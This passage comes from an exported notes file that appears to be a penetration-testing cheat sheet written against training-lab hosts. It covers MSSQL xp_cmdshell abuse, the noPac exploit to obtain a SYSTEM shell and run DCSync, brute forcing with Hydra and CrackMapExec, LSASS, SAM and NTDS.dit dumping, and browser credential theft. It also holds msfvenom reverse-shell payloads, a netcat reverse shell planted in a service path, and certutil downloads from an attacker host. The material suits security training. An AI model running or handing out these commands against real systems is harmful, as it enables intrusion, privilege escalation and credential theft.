      <rich_text family="monospace" background="#000000000000">Import-Module .PowerUpSQL.ps1</rich_text>
      <rich_text background="#000000000000">

Used to import the </rich_text>
      <rich_text family="monospace" background="#000000000000">PowerUpSQL</rich_text>
      <rich_text background="#000000000000"> tool.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-SQLInstanceDomain</rich_text>
      <rich_text background="#000000000000">

PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreightdamundsen" -password "SQL1234!" -query 'Select @@version'</rich_text>
      <rich_text background="#000000000000">

PowerUpSQL tool used to connect to connect to a SQL server and query the version (</rich_text>
      <rich_text family="monospace" background="#000000000000">-query 'Select @@version')</rich_text>
      <rich_text background="#000000000000"> a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">mssqlclient.py</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to display the functionality and options provided with </rich_text>
      <rich_text family="monospace" background="#000000000000">mssqlclient.py</rich_text>
      <rich_text background="#000000000000"> from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to connect to a MSSQL server from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">SQL&gt; help</rich_text>
      <rich_text background="#000000000000">

Used to display mssqlclient.py options once connected to a MSSQL server.

</rich_text>
      <rich_text family="monospace" background="#000000000000">SQL&gt; enable_xp_cmdshell</rich_text>
      <rich_text background="#000000000000">

Used to enable </rich_text>
      <rich_text family="monospace" background="#000000000000">xp_cmdshell stored procedure</rich_text>
      <rich_text background="#000000000000"> that allows for executing OS commands via the database from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">xp_cmdshell whoami /priv</rich_text>
      <rich_text background="#000000000000">

Used to enumerate rights on a system using </rich_text>
      <rich_text family="monospace" background="#000000000000">xp_cmdshell</rich_text>
      <rich_text background="#000000000000">.

</rich_text>
      <rich_text scale="h1" background="#000000000000">NoPac
</rich_text>
      <rich_text background="#000000000000">
Command

Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo git clone https://github.com/Ridter/noPac.git</rich_text>
      <rich_text background="#000000000000">

Used to clone a </rich_text>
      <rich_text family="monospace" background="#000000000000">noPac</rich_text>
      <rich_text background="#000000000000"> exploit using git. Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</rich_text>
      <rich_text background="#000000000000">

Runs </rich_text>
      <rich_text family="monospace" background="#000000000000">scanner.py</rich_text>
      <rich_text background="#000000000000"> to check if a target system is vulnerable to </rich_text>
      <rich_text family="monospace" background="#000000000000">noPac</rich_text>
      <rich_text background="#000000000000">/</rich_text>
      <rich_text family="monospace" background="#000000000000">Sam_The_Admin</rich_text>
      <rich_text background="#000000000000"> from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</rich_text>
      <rich_text background="#000000000000">

Used to exploit the </rich_text>
      <rich_text family="monospace" background="#000000000000">noPac</rich_text>
      <rich_text background="#000000000000">/</rich_text>
      <rich_text family="monospace" background="#000000000000">Sam_The_Admin</rich_text>
      <rich_text background="#000000000000"> vulnerability and gain a SYSTEM shell (</rich_text>
      <rich_text family="monospace" background="#000000000000">-shell)</rich_text>
      <rich_text background="#000000000000"> Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</rich_text>
      <rich_text background="#000000000000">

Used to exploit the </rich_text>
      <rich_text family="monospace" background="#000000000000">noPac</rich_text>
      <rich_text background="#000000000000">/</rich_text>
      <rich_text family="monospace" background="#000000000000">Sam_The_Admin</rich_text>
      <rich_text background="#000000000000"> vulnerability and perform a </rich_text>
      <rich_text family="monospace" background="#000000000000">DCSync</rich_text>
      <rich_text background="#000000000000"> attack against the built-in Administrator account on a Domain Controller from a Linux-based host.</rich_text>
    </node>
  </node>
  <node unique_id="93" master_id="0" name="Password Attacks" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="44" is_bold="1" foreground="#3584e4" ts_creation="1670980264" ts_lastsave="1670984050">
    <node unique_id="95" master_id="0" name="Remote Password Attacks" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670980303" ts_lastsave="1670980321">
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000">crackmapexec winrm &lt;ip&gt; -u user.list -p password.list</rich_text>
      <rich_text background="#000000000000">

Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target.

</rich_text>
      <rich_text family="monospace" background="#000000000000">crackmapexec smb &lt;ip&gt; -u "user" -p "password" --shares</rich_text>
      <rich_text background="#000000000000">

Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials.

</rich_text>
      <rich_text family="monospace" background="#000000000000">hydra -L user.list -P password.list &lt;service&gt;://&lt;ip&gt;</rich_text>
      <rich_text background="#000000000000">

Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.

</rich_text>
      <rich_text family="monospace" background="#000000000000">hydra -l username -P password.list &lt;service&gt;://&lt;ip&gt;</rich_text>
      <rich_text background="#000000000000">

Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service.

</rich_text>
      <rich_text family="monospace" background="#000000000000">hydra -l user.list -p password &lt;service&gt;://&lt;ip&gt;</rich_text>
      <rich_text background="#000000000000">

Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service.

</rich_text>
      <rich_text family="monospace" background="#000000000000">hydra -C &lt;user_pass.list&gt; ssh://&lt;IP&gt;</rich_text>
      <rich_text background="#000000000000">

Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.

</rich_text>
      <rich_text family="monospace" background="#000000000000">crackmapexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --sam</rich_text>
      <rich_text background="#000000000000">

Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.

</rich_text>
      <rich_text family="monospace" background="#000000000000">crackmapexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --lsa</rich_text>
      <rich_text background="#000000000000">

Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear
</rich_text>
      <rich_text family="monospace" background="#000000000000">crackmapexec smb &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; --ntds</rich_text>
      <rich_text background="#000000000000">

Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network.

</rich_text>
      <rich_text family="monospace" background="#000000000000">evil-winrm -i &lt;ip&gt; -u Administrator -H "&lt;passwordhash&gt;"</rich_text>
      <rich_text background="#000000000000">

Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of </rich_text>
      <rich_text family="monospace" background="#000000000000">Pass-The-Hash</rich_text>
      <rich_text background="#000000000000"> attack.</rich_text>
    </node>
    <node unique_id="96" master_id="0" name="Linux Local Password Attacks" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670980303" ts_lastsave="1670980331">
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000">for l in $(echo ".conf .config .cnf");do echo -e "nFile extension: " $l; find / -name *$l 2&gt;/dev/null | grep -v "lib|fonts|share|core" ;done</rich_text>
      <rich_text background="#000000000000">

Script that can be used to find .conf, .config and .cnf files on a Linux system.

</rich_text>
      <rich_text family="monospace" background="#000000000000">for i in $(find / -name *.cnf 2&gt;/dev/null | grep -v "doc|lib");do echo -e "nFile: " $i; grep "user|password|pass" $i 2&gt;/dev/null | grep -v "#";done</rich_text>
      <rich_text background="#000000000000">

Script that can be used to find credentials in specified file types.

</rich_text>
      <rich_text family="monospace" background="#000000000000">for l in $(echo ".sql .db .*db .db*");do echo -e "nDB File extension: " $l; find / -name *$l 2&gt;/dev/null | grep -v "doc|lib|headers|share|man";done</rich_text>
      <rich_text background="#000000000000">

Script that can be used to find common database files.

</rich_text>
      <rich_text family="monospace" background="#000000000000">find /home/* -type f -name "*.txt" -o ! -name "*.*"</rich_text>
      <rich_text background="#000000000000">

Uses Linux
</rich_text>
      <rich_text family="monospace" background="#000000000000">for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "nFile extension: " $l; find / -name *$l 2&gt;/dev/null | grep -v "doc|lib|headers|share";done</rich_text>
      <rich_text background="#000000000000">

Script that can be used to search for common file types used with scripts.

</rich_text>
      <rich_text family="monospace" background="#000000000000">for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "nFile extension: " $ext; find / -name *$ext 2&gt;/dev/null | grep -v "lib|fonts|share|core" ;done</rich_text>
      <rich_text background="#000000000000">

Script used to look for common types of documents.

</rich_text>
      <rich_text family="monospace" background="#000000000000">cat /etc/crontab</rich_text>
      <rich_text background="#000000000000">

Uses Linux-based cat command to view the contents of crontab in search for credentials.

</rich_text>
      <rich_text family="monospace" background="#000000000000">ls -la /etc/cron.*/</rich_text>
      <rich_text background="#000000000000">

Uses Linux-based ls -la command to list all files that start with </rich_text>
      <rich_text family="monospace" background="#000000000000">cron</rich_text>
      <rich_text background="#000000000000"> contained in the etc directory.

</rich_text>
      <rich_text family="monospace" background="#000000000000">grep -rnw "PRIVATE KEY" /* 2&gt;/dev/null | grep ":1"</rich_text>
      <rich_text background="#000000000000">

Uses Linux-based command grep to search the file system for key terms </rich_text>
      <rich_text family="monospace" background="#000000000000">PRIVATE KEY</rich_text>
      <rich_text background="#000000000000"> to discover SSH keys.

</rich_text>
      <rich_text family="monospace" background="#000000000000">grep -rnw "PRIVATE KEY" /home/* 2&gt;/dev/null | grep ":1"</rich_text>
      <rich_text background="#000000000000">

Uses Linux-based grep command to search for the keywords </rich_text>
      <rich_text family="monospace" background="#000000000000">PRIVATE KEY</rich_text>
      <rich_text background="#000000000000"> within files contained in a user's home directory.

</rich_text>
      <rich_text family="monospace" background="#000000000000">grep -rnw "ssh-rsa" /home/* 2&gt;/dev/null | grep ":1"</rich_text>
      <rich_text background="#000000000000">

Uses Linux-based grep command to search for keywords </rich_text>
      <rich_text family="monospace" background="#000000000000">ssh-rsa</rich_text>
      <rich_text background="#000000000000"> within files contained in a user's home directory.

</rich_text>
      <rich_text family="monospace" background="#000000000000">tail -n5 /home/*/.bash*</rich_text>
      <rich_text background="#000000000000">

Uses Linux-based tail command to search the through bash history files and output the last 5 lines.

</rich_text>
      <rich_text family="monospace" background="#000000000000">python3 mimipenguin.py</rich_text>
      <rich_text background="#000000000000">

Runs Mimipenguin.py using python3.

</rich_text>
      <rich_text family="monospace" background="#000000000000">bash mimipenguin.sh</rich_text>
      <rich_text background="#000000000000">

Runs Mimipenguin.sh using bash.

</rich_text>
      <rich_text family="monospace" background="#000000000000">python2.7 lazagne.py all</rich_text>
      <rich_text background="#000000000000">

Runs Lazagne.py with all modules using python2.7

</rich_text>
      <rich_text family="monospace" background="#000000000000">ls -l .mozilla/firefox/ | grep default</rich_text>
      <rich_text background="#000000000000">

Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword </rich_text>
      <rich_text family="monospace" background="#000000000000">default</rich_text>
      <rich_text background="#000000000000"> using grep.

</rich_text>
      <rich_text family="monospace" background="#000000000000">cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .</rich_text>
      <rich_text background="#000000000000">

Uses Linux-based command cat to search for credentials stored by Firefox in JSON.

</rich_text>
      <rich_text family="monospace" background="#000000000000">python3.9 firefox_decrypt.py</rich_text>
      <rich_text background="#000000000000">

Runs Firefox</rich_text>
      <rich_text style="italic" background="#000000000000">decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000">python3 lazagne.py browsers</rich_text>
      <rich_text background="#000000000000">

Runs Lazagne.py browsers module using Python 3.

</rich_text>
      <rich_text family="monospace" background="#000000000000">cmd /c echo %PATH%</rich_text>
      <rich_text background="#000000000000">

Reviewing path variable

</rich_text>
      <rich_text family="monospace" background="#000000000000">curl http://10.10.14.3:8080/srrstr.dll -O "C:UserssarahAppDataLocalMicrosoftWindowsAppssrrstr.dll"</rich_text>
      <rich_text background="#000000000000">

Downloading file with cURL in PowerShell

</rich_text>
      <rich_text family="monospace" background="#000000000000">rundll32 shell32.dll,Control_RunDLL C:UserssarahAppDataLocalMicrosoftWindowsAppssrrstr.dll</rich_text>
      <rich_text background="#000000000000">

Executing custom dll with rundll32.exe

</rich_text>
      <rich_text family="monospace" background="#000000000000">.SharpUp.exe audit</rich_text>
      <rich_text background="#000000000000">

Running SharpUp

</rich_text>
      <rich_text family="monospace" background="#000000000000">icacls "C:Program Files (x86)PCProtectSecurityService.exe"</rich_text>
      <rich_text background="#000000000000">

Checking service permissions with icacls

</rich_text>
      <rich_text family="monospace" background="#000000000000">cmd /c copy /Y SecurityService.exe "C:Program Files (x86)PCProtectSecurityService.exe"</rich_text>
      <rich_text background="#000000000000">

Replace a service binary

</rich_text>
      <rich_text family="monospace" background="#000000000000">wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:windows\" | findstr /i /v """</rich_text>
      <rich_text background="#000000000000">

Searching for unquoted service paths

</rich_text>
      <rich_text family="monospace" background="#000000000000">accesschk.exe /accepteula "mrb3n" -kvuqsw hklmSystemCurrentControlSetservices</rich_text>
      <rich_text background="#000000000000">

Checking for weak service ACLs in the Registry

</rich_text>
      <rich_text family="monospace" background="#000000000000">Set-ItemProperty -Path HKLM:SYSTEMCurrentControlSetServicesModelManagerService -Name "ImagePath" -Value "C:UsersjohnDownloadsnc.exe -e cmd.exe 10.10.10.205 443"</rich_text>
      <rich_text background="#000000000000">

Changing ImagePath with PowerShell

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</rich_text>
      <rich_text background="#000000000000">

Check startup programs

</rich_text>
      <rich_text family="monospace" background="#000000000000">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe &gt; maintenanceservice.exe</rich_text>
      <rich_text background="#000000000000">

Generating a malicious binary

</rich_text>
      <rich_text family="monospace" background="#000000000000">get-process -Id 3324</rich_text>
      <rich_text background="#000000000000">

Enumerating a process ID with PowerShell

</rich_text>
      <rich_text family="monospace" background="#000000000000">get-service | ? {$_.DisplayName -like 'Druva*'}</rich_text>
      <rich_text background="#000000000000">

Enumerate a running service by name with PowerShell

</rich_text>
      <rich_text scale="h2" background="#000000000000">Credential Theft
</rich_text>
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml</rich_text>
      <rich_text background="#000000000000">

Search for files with the phrase "password"

</rich_text>
      <rich_text family="monospace" background="#000000000000">gc 'C:UserslafiAppDataLocalGoogleChromeUser DataDefaultCustom Dictionary.txt' | Select-String password</rich_text>
      <rich_text background="#000000000000">

Searching for passwords in Chrome dictionary files

</rich_text>
      <rich_text family="monospace" background="#000000000000">(Get-PSReadLineOption).HistorySavePath</rich_text>
      <rich_text background="#000000000000">

Confirm PowerShell history save path

</rich_text>
      <rich_text family="monospace" background="#000000000000">gc (Get-PSReadLineOption).HistorySavePath</rich_text>
      <rich_text background="#000000000000">

Reading PowerShell history file

</rich_text>
      <rich_text family="monospace" background="#000000000000">$credential = Import-Clixml -Path 'C:scriptspass.xml'</rich_text>
      <rich_text background="#000000000000">

Decrypting PowerShell credentials

</rich_text>
      <rich_text family="monospace" background="#000000000000">cd c:UserslafiDocuments &amp; findstr /SI /M "password" *.xml *.ini *.txt</rich_text>
      <rich_text background="#000000000000">

Searching file contents for a string

</rich_text>
      <rich_text family="monospace" background="#000000000000">findstr /si password *.xml *.ini *.txt *.config</rich_text>
      <rich_text background="#000000000000">

Searching file contents for a string

</rich_text>
      <rich_text family="monospace" background="#000000000000">findstr /spin "password" *.*</rich_text>
      <rich_text background="#000000000000">

Searching file contents for a string

</rich_text>
      <rich_text family="monospace" background="#000000000000">select-string -Path C:UserslafiDocuments*.txt -Pattern password</rich_text>
      <rich_text background="#000000000000">

Search file contents with PowerShell

</rich_text>
      <rich_text family="monospace" background="#000000000000">dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*</rich_text>
      <rich_text background="#000000000000">

Search for file extensions

</rich_text>
      <rich_text family="monospace" background="#000000000000">where /R C: *.config</rich_text>
      <rich_text background="#000000000000">

Search for file extensions

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ChildItem C: -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore</rich_text>
      <rich_text background="#000000000000">

Search for file extensions using PowerShell

</rich_text>
      <rich_text family="monospace" background="#000000000000">cmdkey /list</rich_text>
      <rich_text background="#000000000000">

List saved credentials

</rich_text>
      <rich_text family="monospace" background="#000000000000">.SharpChrome.exe logins /unprotect</rich_text>
      <rich_text background="#000000000000">

Retrieve saved Chrome credentials

</rich_text>
      <rich_text family="monospace" background="#000000000000">.lazagne.exe -h</rich_text>
      <rich_text background="#000000000000">

View LaZagne help menu

</rich_text>
      <rich_text family="monospace" background="#000000000000">.lazagne.exe all</rich_text>
      <rich_text background="#000000000000">

Run all LaZagne modules

</rich_text>
      <rich_text family="monospace" background="#000000000000">Invoke-SessionGopher -Target WINLPE-SRV01</rich_text>
      <rich_text background="#000000000000">

Running SessionGopher

</rich_text>
      <rich_text family="monospace" background="#000000000000">netsh wlan show profile</rich_text>
      <rich_text background="#000000000000">

View saved wireless networks

</rich_text>
      <rich_text family="monospace" background="#000000000000">netsh wlan show profile ilfreight_corp key=clear</rich_text>
      <rich_text background="#000000000000">

Retrieve saved wireless passwords

</rich_text>
      <rich_text scale="h2" background="#000000000000">Other Commands
</rich_text>
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat</rich_text>
      <rich_text background="#000000000000">

Transfer file with certutil

</rich_text>
      <rich_text family="monospace" background="#000000000000">certutil -encode file1 encodedfile</rich_text>
      <rich_text background="#000000000000">

Encode file with certutil

</rich_text>
      <rich_text family="monospace" background="#000000000000">certutil -decode encodedfile file2</rich_text>
      <rich_text background="#000000000000">

Decode file with certutil

</rich_text>
      <rich_text family="monospace" background="#000000000000">reg query HKEY_CURRENT_USERSoftwarePoliciesMicrosoftWindowsInstaller</rich_text>
      <rich_text background="#000000000000">

Query for always install elevated registry key (1)

</rich_text>
      <rich_text family="monospace" background="#000000000000">reg query HKLMSOFTWAREPoliciesMicrosoftWindowsInstaller</rich_text>
      <rich_text background="#000000000000">

Query for always install elevated registry key (2)

</rich_text>
      <rich_text family="monospace" background="#000000000000">msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi &gt; aie.msi</rich_text>
      <rich_text background="#000000000000">

Generate a malicious MSI package

</rich_text>
      <rich_text family="monospace" background="#000000000000">msiexec /i c:userslafidesktopaie.msi /quiet /qn /norestart</rich_text>
      <rich_text background="#000000000000">

Executing an MSI package from command line

</rich_text>
      <rich_text family="monospace" background="#000000000000">schtasks /query /fo LIST /v</rich_text>
      <rich_text background="#000000000000">

Enumerate scheduled tasks

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ScheduledTask | select TaskName,State</rich_text>
      <rich_text background="#000000000000">

Enumerate scheduled tasks with PowerShell

</rich_text>
      <rich_text family="monospace" background="#000000000000">.accesschk64.exe /accepteula -s -d C:Scripts</rich_text>
      <rich_text background="#000000000000">

Check permissions on a directory

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-LocalUser</rich_text>
      <rich_text background="#000000000000">

Check local user description field

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-WmiObject -Class Win32_OperatingSystem | select Description</rich_text>
      <rich_text background="#000000000000">

Enumerate computer description field

</rich_text>
      <rich_text family="monospace" background="#000000000000">guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd</rich_text>
      <rich_text background="#000000000000">

Mount VMDK on Linux

</rich_text>
      <rich_text family="monospace" background="#000000000000">guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1</rich_text>
      <rich_text background="#000000000000">

Mount VHD/VHDX on Linux

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo python2.7 windows-exploit-suggester.py --update</rich_text>
      <rich_text background="#000000000000">

Update Windows Exploit Suggester database

</rich_text>
      <rich_text family="monospace" background="#000000000000">python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt</rich_text>
      <rich_text background="#000000000000">

Running Windows Exploit Suggester</rich_text>
    </node>
    <node unique_id="97" master_id="0" name="Password Mutations" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670980303" ts_lastsave="1670980341">
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000">cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist</rich_text>
      <rich_text background="#000000000000">

Uses cewl to generate a wordlist based on keywords present on a website.

</rich_text>
      <rich_text family="monospace" background="#000000000000">hashcat --force password.list -r custom.rule --stdout &gt; mut_password.list</rich_text>
      <rich_text background="#000000000000">

Uses Hashcat to generate a rule
</rich_text>
      <rich_text family="monospace" background="#000000000000">./username-anarchy -i /path/to/listoffirstandlastnames.txt</rich_text>
      <rich_text background="#000000000000">

Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.

</rich_text>
      <rich_text family="monospace" background="#000000000000">curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "." | tee -a compressed_ext.txt</rich_text>
      <rich_text background="#000000000000">

Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords.</rich_text>
    </node>
    <node unique_id="98" master_id="0" name="Connecting to Target" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670980303" ts_lastsave="1670980347">
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000">xfreerdp /v:&lt;ip&gt; /u:Lafi /p:Lafi-vault</rich_text>
      <rich_text background="#000000000000">

CLI
</rich_text>
      <rich_text family="monospace" background="#000000000000">evil-winrm -i &lt;ip&gt; -u user -p password</rich_text>
      <rich_text background="#000000000000">

Uses Evil-WinRM to establish a Powershell session with a target.

</rich_text>
      <rich_text family="monospace" background="#000000000000">ssh user@&lt;ip&gt;</rich_text>
      <rich_text background="#000000000000">

Uses SSH to connect to a target using a specified user.

</rich_text>
      <rich_text family="monospace" background="#000000000000">smbclient -U user \\&lt;ip&gt;\SHARENAME</rich_text>
      <rich_text background="#000000000000">

Uses smbclient to connect to an SMB share using a specified user.

</rich_text>
      <rich_text family="monospace" background="#000000000000">python3 smbserver.py -smb2support CompData /home/&lt;nameofuser&gt;/Documents/</rich_text>
      <rich_text background="#000000000000">

Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.</rich_text>
    </node>
    <node unique_id="99" master_id="0" name="Windows Local Password Attacks" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670980303" ts_lastsave="1670980352">
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000">tasklist /svc</rich_text>
      <rich_text background="#000000000000">

A commandbased utility in Windows used to list running processes.

</rich_text>
      <rich_text family="monospace" background="#000000000000">findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</rich_text>
      <rich_text background="#000000000000">

Uses Windows command
</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-Process lsass</rich_text>
      <rich_text background="#000000000000">

A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.

</rich_text>
      <rich_text family="monospace" background="#000000000000">rundll32 C:windowssystem32comsvcs.dll, MiniDump 672 C:lsass.dmp full</rich_text>
      <rich_text background="#000000000000">

Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.

</rich_text>
      <rich_text family="monospace" background="#000000000000">pypykatz lsa minidump /path/to/lsassdumpfile</rich_text>
      <rich_text background="#000000000000">

Uses Pypykatz to parse and attempt to extract credentials &amp; password hashes from an LSASS process memory dump file.

</rich_text>
      <rich_text family="monospace" background="#000000000000">reg.exe save hklmsam C:sam.save</rich_text>
      <rich_text background="#000000000000">

Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklmsam, hklmsecurity, hklmsystem).

</rich_text>
      <rich_text family="monospace" background="#000000000000">move sam.save \&lt;ip&gt;NameofFileShare</rich_text>
      <rich_text background="#000000000000">

Uses move in Windows to transfer a file to a specified file share over the network.

</rich_text>
      <rich_text family="monospace" background="#000000000000">python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</rich_text>
      <rich_text background="#000000000000">

Uses Secretsdump.py to dump password hashes from the SAM database.

</rich_text>
      <rich_text family="monospace" background="#000000000000">vssadmin CREATE SHADOW /For=C:</rich_text>
      <rich_text background="#000000000000">

Uses Windows command line based tool vssadmin to create a volume shadow copy for </rich_text>
      <rich_text family="monospace" background="#000000000000">C:</rich_text>
      <rich_text background="#000000000000">. This can be used to make a copy of NTDS.dit safely.

</rich_text>
      <rich_text family="monospace" background="#000000000000">cmd.exe /c copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy2WindowsNTDSNTDS.dit c:NTDSNTDS.dit</rich_text>
      <rich_text background="#000000000000">

Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of </rich_text>
      <rich_text family="monospace" background="#000000000000">C:</rich_text>
      <rich_text background="#000000000000">.</rich_text>
    </node>
  </node>
  <node unique_id="100" master_id="0" name="Cracking Passwords" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="44" is_bold="1" foreground="#3584e4" ts_creation="1670980438" ts_lastsave="1670984060">
    <node unique_id="101" master_id="0" name="Cracking Passwords" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670980465" ts_lastsave="1670980472">
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt</rich_text>
      <rich_text background="#000000000000">

Uses Hashcat to crack NTLM hashes using a specified wordlist.

</rich_text>
      <rich_text family="monospace" background="#000000000000">hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show</rich_text>
      <rich_text background="#000000000000">

Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.

</rich_text>
      <rich_text family="monospace" background="#000000000000">unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes</rich_text>
      <rich_text background="#000000000000">

Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.

</rich_text>
      <rich_text family="monospace" background="#000000000000">hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked</rich_text>
      <rich_text background="#000000000000">

Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.

</rich_text>
      <rich_text family="monospace" background="#000000000000">hashcat -m 500 -a 0 md5-hashes.list rockyou.txt</rich_text>
      <rich_text background="#000000000000">

Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5

</rich_text>
      <rich_text family="monospace" background="#000000000000">hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked</rich_text>
      <rich_text background="#000000000000">

Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked.

</rich_text>
      <rich_text family="monospace" background="#000000000000">ssh2john.pl SSH.private &gt; ssh.hash</rich_text>
      <rich_text background="#000000000000">

Runs Ssh2john.pl script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash.

</rich_text>
      <rich_text family="monospace" background="#000000000000">john ssh.hash --show</rich_text>
      <rich_text background="#000000000000">

Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal.

</rich_text>
      <rich_text family="monospace" background="#000000000000">office2john.py Protected.docx &gt; protected-docx.hash</rich_text>
      <rich_text background="#000000000000">

Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.

</rich_text>
